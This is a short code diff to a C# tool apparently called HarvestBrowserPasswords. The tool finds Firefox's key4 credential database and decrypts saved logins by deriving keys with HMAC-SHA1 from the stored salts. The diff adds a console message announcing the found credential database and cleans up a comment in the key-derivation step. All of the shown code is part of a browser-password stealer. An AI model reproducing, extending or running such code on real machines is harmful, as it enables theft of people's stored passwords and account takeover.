@@ -34,6 +34,9 @@ namespace HarvestBrowserPasswords
             //Check profile for key4 database before attempting decryption
             if (File.Exists(Key4dbpath))
             {
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine($"[+] Found Firefox credential database at: \"{Key4dbpath}\"");
+                Console.ResetColor();
                 Key4DatabaseConnection(Key4dbpath);
 
                 //Store a RootObject from FirefoxLoginsJSON (hopefully) containing multiple FirefoxLoginsJSON.Login instances
@@ -207,7 +210,7 @@ namespace HarvestBrowserPasswords
                     Buffer.BlockCopy(paddedEntrySalt, 0, firstHalf, 0, paddedEntrySalt.Length);
                     Buffer.BlockCopy(entrySalt, 0, firstHalf, paddedEntrySalt.Length, entrySalt.Length);
 
-                    //Create TK thing?? = HMAC-SHA1(combinedHashedPassword, paddedEntrySalt)
+                    //Create TK = HMAC-SHA1(combinedHashedPassword, paddedEntrySalt)
                     keyFirstHalf = hmac.ComputeHash(firstHalf);
                     byte[] tk = hmac.ComputeHash(paddedEntrySalt);
 
